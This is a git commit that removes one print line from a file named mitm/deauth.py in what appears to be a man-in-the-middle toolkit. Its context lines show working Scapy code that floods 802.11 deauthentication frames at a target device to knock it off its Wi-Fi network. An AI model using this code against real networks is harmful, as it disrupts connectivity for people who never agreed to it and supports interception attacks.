df98fcabc4f5ab8d1dc462ccb8b2cdae7d0191c7
Lloen <lloen@ymail.com>
2021-06-22 17:27:37 +0200

    removed print

--- mitm/deauth.py
+++ mitm/deauth.py
@@ -14,7 +14,6 @@ def run_deauth(target_mac, gateway_mac):
                 packet = RadioTap()/Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)/Dot11Deauth(reason=7)
                 sendp(packet, inter=0.1, count=10000, iface=interface_monitor, verbose=1)
     except Exception as e:
-        print(e)
         os.system(interface_stop_monitor_cmd)
     finally:
         os.system(interface_stop_monitor_cmd)
